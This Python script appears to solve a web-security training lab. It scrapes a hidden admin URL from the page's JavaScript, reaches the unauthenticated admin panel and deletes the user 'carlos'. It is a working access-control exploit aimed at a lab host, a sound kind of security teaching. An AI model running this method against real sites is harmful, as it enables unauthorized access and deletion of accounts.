import requests
from bs4 import BeautifulSoup

site = "0a0d003f030ac41985430ebb00e90083.web-security-academy.net"
s = requests.Session()

# Step 1: Load the main page
main_url = f'https://{site}/'
resp = s.get(main_url)
soup = BeautifulSoup(resp.text, 'html.parser')

# Step 2: Extract hidden admin URI from the second <script> tag
script = soup.find_all('script')[1].contents[0]
match_line = [line for line in script.split('\n') if 'admin-' in line]
uri = match_line[0].split("'")[3]

# Step 3: Load the hidden admin page
admin_url = f'https://{site}{uri}'
resp = s.get(admin_url)
soup = BeautifulSoup(resp.text, 'html.parser')

# Step 4: Delete carlos
carlos_delete_link = [link for link in soup.find_all('a') if 'carlos' in link.get('href')]
delete_uri = carlos_delete_link[0]['href']
final_resp = s.get(f'https://{site}{delete_uri}')

print("Carlos deleted successfully." if final_resp.status_code == 200 else "Deletion failed.")
